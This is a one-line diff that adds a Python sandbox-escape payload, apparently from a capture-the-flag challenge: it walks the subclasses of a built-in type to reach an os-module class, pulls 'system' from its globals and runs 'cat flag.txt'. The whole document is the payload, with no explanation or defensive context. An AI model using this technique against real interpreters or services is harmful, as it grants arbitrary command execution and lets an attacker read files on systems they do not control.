@@ -1,0 +1,1 @@
+[x.__init__.__globals__['system']('cat flag.txt') for x in dict.__base__.__subclasses__() if 'os' in x.__name__] 
